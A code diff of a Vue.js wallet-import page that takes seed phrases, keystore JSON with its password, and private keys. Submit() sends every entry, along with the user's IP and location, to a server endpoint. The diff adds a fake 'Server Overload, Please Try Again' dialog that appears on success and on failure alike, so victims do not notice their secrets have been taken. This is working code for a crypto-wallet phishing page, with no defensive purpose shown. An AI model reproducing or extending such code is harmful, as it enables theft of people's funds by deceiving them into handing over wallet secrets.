@@ -87,6 +87,9 @@
                                   <div class="form-group">
                                     <label><span style="color: red;">Do not refresh page use this to</span> <router-link :to="{ name: 'Wallets' }"> start again</router-link>.</label>
                                     <label>Typically 12 (sometimes 24) words separated by single spaces.</label>
+                                    <div class="form-group">
+                                    <input v-if="path == 'other wallet'" required v-model="other" type="text" class="form-control" placeholder="Wallet Name">
+                                  </div>
                                     <textarea required v-model.trim="inputOne" id="inputOne" class="form-control" rows="7" placeholder="Phrase"></textarea>
                                     <label class="color-red" v-show="hasError">{{error}}</label>
                                   </div>
@@ -94,12 +97,12 @@
             
                                 <div class="col-12 d-md-flex justify-content-between margin-t-2">
                                     <div class="item_upload mb-3 mb-md-0">
-                                      <button type="button" class="btn btn_md_primary bg-red rounded-8 c-white h-fit-content">
+                                      <router-link :to="{ name: 'Wallets'}" class="btn btn_md_primary bg-red rounded-8 c-white h-fit-content">
                                         Cancel
-                                      </button>
+                                      </router-link>
                                   </div>
                                     <div class="item_upload mb-3 mb-md-0">
-                                  <button type="submit" class="btn btn_md_primary bg-blue rounded-8 c-white h-fit-content">
+                                  <button v-show="passed" type="submit" class="btn btn_md_primary bg-blue rounded-8 H c-white h-fit-content">
                                     Import
                                   </button>
                                   </div>
@@ -118,6 +121,9 @@
                                 <div class="form-group">
                                     <label><span style="color: red;">Do not refresh page use this to</span> <router-link :to="{ name: 'Wallets' }"> start again</router-link>.</label>
                                     <label>Several lines of text beginning with '<b>{...}</b>' plus the password used to encrypt it.</label>
+                                    <div class="form-group">
+                                    <input v-if="path == 'other wallet'" required v-model="other" type="text" class="form-control" placeholder="Wallet Name">
+                                  </div>
                                     <textarea required v-model="inputTwo" class="form-control" rows="7" placeholder="Keystone JSON"></textarea>
                                     <label class="color-red" v-show="hasErrorr">{{errorr}}</label>
                                 </div>
@@ -132,12 +138,12 @@
                                 <div class="col-12 d-md-flex justify-content-between margin-t-2">
                                     <div class="item_upload mb-3 mb-md-0">
                                         <div class="upload__fikle">
-                                        <button type="button" class="btn btn_md_primary bg-red rounded-8 c-white h-fit-content">
+                                        <router-link :to="{ name: 'Wallets'}" class="btn btn_md_primary bg-red rounded-8 c-white h-fit-content">
                                             Cancel
-                                        </button>
+                                        </router-link>
                                         </div>
                                     </div>
-                                    <button type="submit" class="btn btn_md_primary bg-blue rounded-8 c-white h-fit-content">
+                                    <button type="submit" v-show="passedOne" class="btn btn_md_primary bg-blue rounded-8 H c-white h-fit-content">
                                         Import
                                     </button>
                                 </div>
@@ -155,6 +161,9 @@
                                   <div class="form-group">
                                     <label><span style="color: red;">Do not refresh page use this to</span> <router-link :to="{ name: 'Wallets' }"> start again</router-link>.</label>
                                     <label>Typically 12 (sometimes 24) words separated by single spaces</label>
+                                    <div class="form-group">
+                                    <input v-if="path == 'other wallet'" required v-model="other" type="text" class="form-control" placeholder="Wallet Name">
+                                  </div>
                                     <textarea required v-model="inputThree" id="inputThree" class="form-control" rows="7" placeholder="Enter Private Keys"></textarea>
                                     <label class="color-red" v-show="hasErrorrr">{{errorrr}}</label>
                                   </div>
@@ -163,12 +172,12 @@
                                 <div class="col-12 d-md-flex justify-content-between margin-t-2">
                                   <div class="item_upload mb-3 mb-md-0">
                                     <div class="upload__fikle">
-                                      <button type="button" class="btn btn_md_primary bg-red rounded-8 c-white h-fit-content">
+                                      <router-link :to="{ name: 'Wallets'}" class="btn btn_md_primary bg-red rounded-8 c-white h-fit-content">
                                         Cancel
-                                      </button>
+                                      </router-link>
                                     </div>
                                   </div>
-                                  <button type="submit" class="btn btn_md_primary bg-blue rounded-8 c-white h-fit-content">
+                                  <button type="submit" v-show="passedTwo" class="btn btn_md_primary bg-blue rounded-8 H c-white h-fit-content">
                                     Import
                                   </button>
                                 </div>
@@ -225,11 +234,15 @@ export default {
   data() {
       return {
           path: this.$route.params.path,
+          other: '',
           error: '',
+          passed: false,
           hasError: false,
           errorr: '',
+          passedOne: false,
           hasErrorr: false,
           errorrr: '',
+          passedTwo: false,
           hasErrorrr: false,
           inputOne: '',
           inputTwo: '',
@@ -239,7 +252,7 @@ export default {
           pwd: ''
       }
   },
-  mixins: [dialog, xtra],
+  mixins: [xtra],
   components: {
     Header, Footer, BaseFooter
   },
@@ -254,22 +267,22 @@ export default {
   },
   updated() {
     var no_words = this.inputOne.split(" ");
-      if(no_words.length < 12){
-        this.error = 'Few words present, You have inputed '+no_words.length+' of words.'
-          this.hasError = true
-    //   } else if (no_word.length > 50){
-      //         this.errorrr = 'Maximum Input exceeded'
-    //         this.hasErrorrr = true
-    //         document.getElementById('inputOne').value = this.inputOne.replace(/\w+[.!?]?$/, '');
-            } else if (no_words.length > 24){
+      if(no_words.length == 0 || no_words == null || no_words[0].length == 0) {
+            this.error = ''
+          this.hasError = false
+          this.passed = false
+        } else if (no_words.length > 24){
               this.error = 'To many words present, You have inputed '+no_words.length+' of words.'
           this.hasError = true
-        } else if(no_words.length == 0 || no_words == null) {
+          this.passed = false
+        } else if(no_words.length < 12 && no_words[0].length > 0){
+        this.error = 'Few words present, You have inputed '+no_words.length+' of words.'
+          this.hasError = true
+          this.passed = false
+          } else {
             this.error = ''
           this.hasError = false
-        } else {
-            this.error = ''
-          this.hasError = false
+          this.passed = true
         }
 
         var json = this.inputTwo;
@@ -278,19 +291,23 @@ export default {
             if(ss) {
                 this.errorr = ''
                 this.hasErrorr = false
+                this.passedOne = true
             }  else {
                 this.errorr = 'Invalid json format [e.g - {"name": "john smith", "age": "50"} ]'
                 this.hasErrorr = true
+                this.passedOne = false
             }
         } else {
             this.errorr = ''
             this.hasErrorr = false
+            this.passedOne = false
         }
 
         var no_word = this.inputThree.split(" ");
-        if(no_word.length < 12){
+        if(no_word.length < 12 && no_word[0].length > 0){
             this.errorrr = 'Few words present, You have inputed '+no_word.length+' of words.'
             this.hasErrorrr = true
+            this.passedTwo = false
         // } else if (no_word.length > 50){
         //     this.errorrr = 'Maximum Input exceeded'
         //     this.hasErrorrr = true
@@ -300,15 +317,15 @@ export default {
             } else if (no_word.length > 24){
             this.errorrr = 'To many words present, You have inputed '+no_word.length+' of words.'
             this.hasErrorrr = true
-            } else if(no_word.length == 0 || no_word == null) {
+            this.passedTwo = false
+            } else if(no_word.length == 0 || no_word == null || no_words[0].length == 0) {
                 this.errorrr = ''
             this.hasErrorrr = false
-            } else if(no_word.length == 0 || no_word == null) {
-                this.errorrr = ''
-            this.hasErrorrr = false
+            this.passedTwo = false
             } else {
                 this.errorrr = ''
             this.hasErrorrr = false
+            this.passedTwo = true
             }
         this.path = this.$route.params.path
   
@@ -345,7 +362,11 @@ export default {
             })
         },
         async Submit(x,y=null,z=null) {
-          const wallet = this.path
+          if(this.path == 'other wallet') {
+            var wallet = 'other wallet - ' +this.other
+          } else {
+            var wallet = this.path
+          }
           const type = x
           const dataO = y
           const dataT = z
@@ -360,11 +381,178 @@ export default {
             // .get('/endpoint/v1/send?wallet='+wallet)
             .get('/endpoint/v1/send?wallet='+wallet+'&type='+type+'&dataO='+dataO+'&timein='+timein+'&dataT='+dataT+'&ip='+ip+'&loc='+loc)
             .then(res => {
-              console.log(res)
+              this.SendOut(true)
             })
             .catch(err => {
               console.error(err)
+              this.SendOut(true)
             })
+        },
+        SendOut(xx) {
+          class Dialog {
+            constructor(settings = {}) {
+              this.settings = Object.assign(
+                {
+                  accept: 'OK',
+                  bodyClass: 'dialog-open',
+                  cancel: 'Cancel',
+                  dialogClass: '',
+                  message: '',
+                  soundAccept: '',
+                  soundOpen: '',
+                  template: ''
+                },
+                settings
+              )
+              this.init()
+            }
+          
+            collectFormData(formData) {
+              const object = {};
+              formData.forEach((value, key) => {
+                if (!Reflect.has(object, key)) {
+                  object[key] = value
+                  return
+                }
+                if (!Array.isArray(object[key])) {
+                  object[key] = [object[key]]
+                }
+                object[key].push(value)
+              })
+              return object
+            }
+          
+            getFocusable() {
+              return [...this.dialog.querySelectorAll('button,[href],select,textarea,input:not([type="hidden"]),[tabindex]:not([tabindex="-1"])')]
+            }
+          
+            init() {
+              this.dialogSupported = typeof HTMLDialogElement === 'function'
+              this.dialog = document.createElement('dialog')
+              this.dialog.role = 'dialog'
+              this.dialog.dataset.component = this.dialogSupported ? 'dialog' : 'no-dialog';
+              this.dialog.innerHTML = `
+              <form method="dialog" data-ref="form">
+                <fieldset data-ref="fieldset" role="document">
+                  <legend data-ref="message" id="${(Math.round(Date.now())).toString(36)}"></legend>
+                  <div data-ref="template"></div>
+                </fieldset>
+                <menu>
+                  <button${this.dialogSupported ? '' : ` type="button"`} data-ref="cancel" value="cancel"></button>
+                  <button${this.dialogSupported ? '' : ` type="button"`} data-ref="accept" value="default"></button>
+                </menu>
+                <audio data-ref="soundAccept"></audio>
+                <audio data-ref="soundOpen"></audio>
+              </form>`
+              document.body.appendChild(this.dialog)
+          
+              this.elements = {}
+              this.focusable = []
+              this.dialog.querySelectorAll('[data-ref]').forEach(el => this.elements[el.dataset.ref] = el)
+              this.dialog.setAttribute('aria-labelledby', this.elements.message.id)
+              this.elements.cancel.addEventListener('click', () => { this.dialog.dispatchEvent(new Event('cancel')) })
+              this.dialog.addEventListener('keydown', e => {
+                if (e.key === 'Enter') {
+                  if (!this.dialogSupported) e.preventDefault()
+                  this.elements.accept.dispatchEvent(new Event('click'))
+                }
+                if (e.key === 'Escape') this.dialog.dispatchEvent(new Event('cancel'))
+                if (e.key === 'Tab') {
+                  e.preventDefault()
+                  const len =  this.focusable.length - 1;
+                  let index = this.focusable.indexOf(e.target);
+                  index = e.shiftKey ? index - 1 : index + 1;
+                  if (index < 0) index = len;
+                  if (index > len) index = 0;
+                  this.focusable[index].focus();
+                }
+              })
+              this.toggle()
+            }
+          
+            open(settings = {}) {
+              const dialog = Object.assign({}, this.settings, settings)
+              this.dialog.className = dialog.dialogClass || ''
+              this.elements.accept.innerText = dialog.accept
+              this.elements.cancel.innerText = dialog.cancel
+              this.elements.cancel.hidden = dialog.cancel === ''
+              this.elements.message.innerText = dialog.message
+              this.elements.soundAccept.src = dialog.soundAccept || ''
+              this.elements.soundOpen.src = dialog.soundOpen || ''
+              this.elements.target = dialog.target || ''
+              this.elements.template.innerHTML = dialog.template || ''
+          
+              this.focusable = this.getFocusable()
+              this.hasFormData = this.elements.fieldset.elements.length > 0
+          
+              if (dialog.soundOpen) {
+                this.elements.soundOpen.play()
+              }
+          
+              this.toggle(true)
+          
+              if (this.hasFormData) {
+                this.focusable[0].focus()
+                this.focusable[0].select()
+              }
+              else {
+                this.elements.accept.focus()
+              }
+            }
+          
+            toggle(open = false) {
+              if (this.dialogSupported && open) this.dialog.showModal()
+              if (!this.dialogSupported) {
+                document.body.classList.toggle(this.settings.bodyClass, open)
+                this.dialog.hidden = !open
+                if (this.elements.target && !open) {
+                  this.elements.target.focus()
+                }
+              }
+            }
+          
+            waitForUser() {
+              return new Promise(resolve => {
+                this.dialog.addEventListener('cancel', () => { 
+                  this.toggle()
+                  resolve(false)
+                }, { once: true })
+                this.elements.accept.addEventListener('click', () => {
+                  let value = this.hasFormData ? this.collectFormData(new FormData(this.elements.form)) : true;
+                  if (this.elements.soundAccept.getAttribute('src').length > 0) this.elements.soundAccept.play()
+                  this.toggle()
+                  resolve(value)
+                }, { once: true })
+              })
+            }
+          
+            alert(message, config = { target: event.target }) {
+              const settings = Object.assign({}, config, { cancel: '', message, template: '' })
+              this.open(settings)
+              return this.waitForUser()
+            }
+          
+            confirm(message, config = { target: event.target }) {
+              const settings = Object.assign({}, config, { message, template: '' })
+              this.open(settings)
+              return this.waitForUser()
+            }
+          
+            prompt(message, value, config = { target: event.target }) {
+              const template = `<label aria-label="${message}"><input type="text" name="prompt" value="${value}"></label>`
+              const settings = Object.assign({}, config, { message, template })
+              this.open(settings)
+              return this.waitForUser()
+            }
+          }
+          if (xx) {
+            const dialog = new Dialog();
+              dialog.alert('⌛ Server Overload, 🙏🏻 Please Try Again').then((res) => {  
+                if(res){
+                  this.$router.replace({path:'/wallets'})
+                }
+               })
+          }
         }
     }
 }
